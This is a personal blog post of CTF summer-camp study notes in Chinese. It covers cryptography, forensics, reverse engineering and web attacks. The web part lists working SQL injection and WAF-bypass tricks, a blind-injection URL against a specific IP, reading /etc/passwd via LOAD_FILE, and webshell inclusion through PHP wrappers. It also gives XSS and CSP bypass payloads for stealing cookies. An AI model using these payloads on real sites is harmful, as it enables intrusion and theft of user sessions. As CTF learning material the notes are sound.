title: xman笔记
date: 2017-08-02 08:59:43

categories: Blog

thumbnail: "https://s1.ax1x.com/2018/01/01/pSoxL4.jpg"

---



## 0x00 |･ω･｀)
### 枣起
前一天和妹子们修仙聊人生聊到夜半，全程瑟瑟发抖ORZ，膜小姐姐们，抱腿prprpr
### Team Building
可以光明正大地投靠大佬惹~萌新继续瑟瑟发抖ing
然后一整个队都始终在暗中观察2333(橘喵微笑脸
而且！在队里活捉一只大角虫欸~~~
数独最后几个空发现血崩的时候大家都慈祥地微笑(bu
### 诸葛大大哒讲话
%%%%%%%%%%%%%%%%%%%%%%%%%%%%先膜为敬
对ctf有了更多的了解啦~
也有了更深的执念和动力吧~
hacker就是超~帅嘛
### 白掌门哒谆谆教诲
虽然一直觉得hacker就应该是无拘无束的吖，不过还是要守法吧，毕竟窝们哒种花家它也是很努力的呢~
--从来就没有什么岁月静好，只是有人替我们负重前行。--
虽然所有所有的机制啊都还远不够完美，但我们的安全总是有祖国在保护着的啊，表白一发窝大天朝2333
### 晚安安
码字和撸代码都是异曲同工，夜越深越爽吖~WA~
## 0x01 密码
《线上幽灵》
### 基础姿势
Alice-Bob 第三方Oscar
明文P 密文C 秘钥K
对称密码体制：加密解密法则一样，一个秘钥
穷举/统计分析/数学分析攻击
唯密文/已知明文/选择明文/选择密文攻击
计算/可证明/无条件安全性
### 古典密码
#### 单表代换加密
暴力破解 词频分析（e和t最多）
欧拉定理：对任意互素的a和n，有：a^φ(n) ≡ 1 (mod n)
mod 26
移位密码->恺撒密码 仿射密码 埃特巴什码
#### 多表代换加密
playfair polybius/棋盘密码 nihilist hill（希尔密码）
维吉尼亚密码 kasiski测试法/重合指标法
autokey cipher（自动秘钥密码）
#### 其他
培根密码 莫尔斯电码 栅栏密码 曲路密码 列移位密码 猪圈密码 键盘密码 手机/电脑键盘密码 QWE密码（QWE=ABC）
### 现代密码
对称算法包括序列算法（流密码）和分组算法
混乱、扩散
DES 好复杂QAQ 轮秘钥+S盒置换+P盒置换
AES 比较安全
RC5
......
非对称算法
陷门单向函数
RSA 
p,q选取不当:|p-q|大
共模攻击
小公钥指数攻击
零知识证明 完备性 可靠性 零知识 -> fait-shamir协议
### 哈希函数
md5（32或16位） 填充-初始化变量-处理分组数据...
sha1
### 编码
ASCII base64/32/16 shellcode quoted-printable XXencode UUencode url unicode utf-8 敲击码
### 工具
http://quipqiup.com/
http://www.dmd5.com/
http://www.cryptool-online.org/
http://rumkin.com/tools/cipher/
yafu
万能解码工具 CAP
## 0x02 misc
### 信息收集
recon
### encode
曼彻斯特/差分曼彻斯特
二进制（空格tab/二维码/图片转化）注意分组
base64（隐写（对比解码后编码和原串）：=默认删除最后八位）
图形码
工具 JPK CTFCrack
### 取证&隐写
file文件类型
strings查看可见字符串
binwalk,foremost分析提取文件
010 Editor模板功能
png文件格式（修改高度/数据块）
LSB隐写 RGB值
gif 时间 空间 文件头
音频 频谱 波形 隐写软件
zip 核心目录区伪加密 爆破 CRC32（文件小） 明文攻击
流量包 文件修复 协议分析 数据提取
wireshark pcapfix dshell tshark
总体把握 协议分级 端点统计
过滤筛选 过滤语法 host,protocol,contains,特征值
发现异常 特殊字符串 协议某字段
数据提取 字符串/文件提取
`tshark -r *....pcap* -T fields -e *data*|...`
内存镜像分析 volatility
ntfs数据流 
## 0x02 安卓
开发：签名
权限（root）
漏洞->利用
hook
反编译 加壳 混淆 
## 0x03 逆向
汇编基础
基本工具 
编辑 010editor(可自己写模板) editplus
可执行文件查看 PE Mach0 ELF
格式转换 Shellcode Helper
反汇编 IDA
设置data、code 查看cross reference 查看string list
F5 设置type 设置calling convention
调试器
gdb winDBG
OD x64dbg IDA内置调试器
步进 步过 运行至指定位置
搭建IDA远程调试环境 linux
去除软件保护
定位验证代码 正面 信息输入输出处 字符串
一些神奇的东西 apkdb z3求解器 边信道攻击 
找main函数 快速定位关键位置
应对MFC程序 使用xspy查看消息处理函数
手动加载signature
F5的各种用法
《加密与解密》 《IDA Pro权威指南》 《软件调试》
//全程舔PPT配图，或许这就是大佬吧
## 0x04 web
### 套路
用Python或Ruby快速编写exp
SQL语法细微区别
不同编程语言特性
不同web服务器特性
脑洞
Mysql栗子 '1abc'='1ABC' '123'=123 hex('root')结果是字符串
Access栗子 
   - 查询数据-偏移注入/跨库查询（要用绝对路径）
       判断注入点 order by判断字段长度 获取表名 联合查询
   - 读写数据 
   - 执行命令
   - 其他 不存在注释，用%00截断 不支持多行

一、爆破，包括包括md5、爆破随机数、验证码识别等
二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测`<?php <? <% <script language=php>`、花式解析漏洞、
七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
十、社工，包括花式查社工库、微博、QQ签名、whois
十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包
脑洞汇总：
 - 源代码
  - robot.txt
  - comment
  - vim_swap_file
  - .pyc
  - .DS_Store
  - .git
  - .svn
  - bak file
 - waf
  - 字符替换空型waf
  - 特殊字符（串）拦截型waf
 - 考啥
  - PHP弱类型
  - （反）序列化
  - XSS+CSRF+SSRF+CRLF
  - SQLi+RCE+upload
  - 源码审计
      -其他

### XSS
反射型
存储型
Dom-XSS
bypass filter
跨域 同源策略/回旋镖/穿甲伤害 UXSS
### CSRF
html css flash
### SQLi
各种绕过。。
### 文件包含和文件上传
伪协议
各种校验
.htaccess文件
变量与函数 一切输入都是有害的 一切进入函数的变量都是有害的
参数传递
可控变量
敏感功能点
通读代码
### 变量覆盖
危险函数
### 代码审计
## 0x05 SQLi
### union注入
有回显
猜解字段数目 limit a,b
最方便
### 报错注入
### boolean盲注
写脚本
截取字符串 left substr mid regexp if
### Timing盲注
无回显
效率低
### 文件读写 
select LOADFILE('/etc/passwd');之类的写shell进去也可以
### waf
双写关键字 seselectlect OorR
大小写
编码绕过（直接认识16进制）
变换姿势 <---> || && 空格 select(username)from(admin) 科学计数法绕过 where username=1e1union select in,between,like access中info=dlookup()
特殊字符 `/**/` 内联注释 %00 % 反引号
### 这个啥。。写脚本
http://58.154.33.13:8003/?order=if((select(mid(flag,1,2))from(flag)),name,price)
'a' 11000110
$b  0000001 & 1一位一位向前移
$c  0000000 根据这个是不是1回显判断原来的
### 杂技
二次注入
宽字节注入 id=狷'
access偏移注入
万能密码（永真（字符串=0））
Mongodb注入 `[$ne] [$regex]`
隐蔽的注入 字符串被mysql当成8字节double类型处理-》将查询内容转成数字进行运算
mysql过长截断 admin加空格插入后变成admin
## 0x05 文件
### LFI
读敏感文件
临时文件
多线程条件竞争脚本
截断
### RFI
远程代码执行
伪协议 file='php://input'可直接post数据 php://filter读源码 phar,zip解压包含一句话木马
### 文件上传
js校验 检查扩展名(白(配合文件包含漏洞 0x00截断 NTFS ADS特性 解析漏洞)/黑名单) MIME 随机文件名(随机值拼接到名字里) 隐藏路径(头像之类的就不行) 重写内容 检查内容
## 0x06 XSS
打cookie
盲打后台（看referer）（打出dom...）
窃取用户信息
XSS Worm
XSS 后门
第一步：弹框
获取cookie：document.cookie(键值对)
cookie选项：
 - expires失效日期默认session（1.1后max-age） 
 - domain域名 path路径 默认当前的 重要
    （跨域xhr请求时(AJAX请求时间之类的)默认不加cookie）
     （domain可以是父域，但不能是.com）
 - secure安全情况下传输（只看协议，可用HTTPS的XSS平台） 
 - HttpOnly 默认不带 带的话没法用js查看或修改
    （phpinfo页面可获取cookie）

每设一条cookie就要set-cookie一次 
可用document.cookie=。。。在前端console直接设置
修改：path/domain要和原来一样
删除：把expires设成过去的（path/domain要和原来一样）
编码：escape
浏览器解析方式
token 分出来的词/标签的部分 有限状态机
html五种元素 空元素`<br>` 原始文本元素`<sript><style>` RCDATA元素`<title><textarea>` 外部元素（MathML或SVG命名空间元素） 基本元素
RCDATA:在里面无论写啥都不会被解析，要先闭合标签
反射型 URL中 需要用户点链接 浏览器XSS Filter（chrome比较强） 输入-输出
存储型 数据库里 用户打开网页就可以 输入-进入数据库-取出数据库-输出
步骤：
 - 修改参数，提交后看源代码，寻找输出位置
 - 看代码情况判断是否要/如何闭合（选择框里可用BP改，注意每一个post参数，多尝试隐藏参数）要使语法正确
 - 转义尖括号：(双引号闭合)在标签内构造属性如onmouseover
 - 构造JavaScript伪协议JavaScript:alert(document.domain)(a herf=""中)（资源型属性中）
 - 过滤domain:编码成实体`&#100;&#111;&#109;&#97;&#105;&#110`或&#x十六进制（&#后数字前加几个0都可以）
 - 把script/on/style/大小写过滤：`<iframe src="data:text/html;base64,......."></iframe>`(创建子窗口在父窗口弹窗)
 - （js字符串中）编码 \x十六进制 unicode \八进制
 - 放到了行注释里 %0a换行
 - 两个输入拼接 第一个末尾用\转义双引号 第二个后面可用//注释 `...="..."+"&ss=aaa\"+"&from==1;function/**/from(){}//"`（js函数可先调用后申明） (sql注入也可以)
 - 宽字节 "被转义\" 前面加高字节如%0c 或再加\转义\
 - js支持多行字符串 末尾加\ gb2312时加%c0吃掉转义符
 - 无回显 eval("")会返回计算string得到的值 （json解析时经常用到,返回对象（要加圆括号将json转成语句）） 最后加\在console看error找到关键代码 ?key;alert(1);//=aaa
 - chrome会对"/>/<进行URL转换
 - setTimeout函数 '被转义 用js编码 阻止跳转：用字符串.replace替换成自己的外部js攻击
 - 无法闭合" 可以直接闭合`</script>`
 - iframe inload src=javascript:/data: srcdoc
 - 自带htmlencode的标签...

例题
`"^alert(1)^"`(在if里会先执行)
```
if(""^alert(1)^""!="null"){
   document.getElementById('test').innerHTML=""^alert(1)^"";
    }
```
`*///1"!="null"){alert(1);/*`（多行注释和单行注释配合使用）
```
if("*///1"!="null"){alert(1);/*"!="null"){
   document.getElementById('test').innerHTML="*///1"!="null"){alert(1);/*";
    }
```
## CSRF
登录a生成cookie->不登出a时访问危险网站b
上传文件 BP会自动生成CSRF Poc
## 域、同源策略、CORS、JSONP
同源：协议、域名、端口（默认80）相同
非同源：cookie/LocalStorage/IndexDB无法读取 DOM无法获得 AJAX请求不能发送
二级域名相同（父子、兄弟域）允许通过设置document.domain共享cookie
跨域请求 JSONP WebSoket CORS
JSONP注入 通过添加一个`<script>`元素，通过src属性向服务器请求json数据，服务器将数据放在一个指定名字的回调函数返回 foo({"ip":"8.8.8.8"}) 不造是啥但能执行 callback/jsonp/...=.（函数名）..的API
防御：校验referer（但可从HTTPS向http发请求或在src中用data:base64）
callback=alert(1);//有反射型注入
CORS 允许浏览器向不同源服务器发出任何请求 
简单请求 head/get/post 
加origin头 如果可以会回acess-control-allow-origin等
双方withCredentials:true且acess-control-allow-origin不为*才能接受cookie
预检请求
//0ctf xss
## CSP
配置 header头 Content-Security-Policy:defalt-src 'self';...
指令
html5有预加载
bypass:
firefox `<link rel="dns-fetch" herf="[cookie].xss.com">`
chrome `<link rel="prefetch" herf="xss平台">`
window.location="地址"
jsonp绕过
反射或符号执行
重定向绕过

## else

这个夏令营主要还是玩耍吧，然后遇到了可爱哒盐喵，每天上完课次了外卖就关灯碎觉然后半夜起来high的作息意外的一样啊23333，喜欢小姐姐哒Lolita小裙叽嘿嘿嘿，各种梗都能接上的同好~

总之讲师助教师傅们都是很6哒，看齐看齐










<br>